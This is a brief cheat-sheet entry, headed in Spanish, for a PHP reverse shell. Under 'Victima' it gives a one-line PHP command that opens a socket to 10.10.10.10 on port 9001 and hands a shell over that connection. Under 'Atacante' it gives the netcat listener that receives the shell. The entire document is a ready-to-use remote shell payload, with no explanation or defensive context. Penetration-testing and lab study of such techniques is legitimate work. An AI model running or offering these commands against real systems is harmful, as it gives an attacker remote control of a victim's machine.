# PHP reverse shell

#### Victima

```shell
php -r '$sock=fsockopen("10.10.10.10",9001);exec("sh <&3 >&3 2>&3");'
```

#### Atacante

```shell
sudo nc -lvnp 9001
```

